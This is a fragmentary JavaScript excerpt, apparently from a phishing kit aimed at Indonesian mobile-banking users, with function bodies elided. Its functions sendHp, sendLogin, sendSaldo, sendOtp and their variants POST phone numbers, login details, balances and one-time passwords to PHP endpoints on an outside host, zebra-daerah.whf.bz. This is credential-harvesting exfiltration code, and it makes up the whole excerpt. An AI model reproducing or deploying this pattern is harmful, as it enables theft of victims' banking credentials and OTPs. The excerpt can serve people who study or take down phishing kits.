function sendHp() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://zebra-daerah.whf.bz/awx/13/otpblm.php',
      type: 'POST',
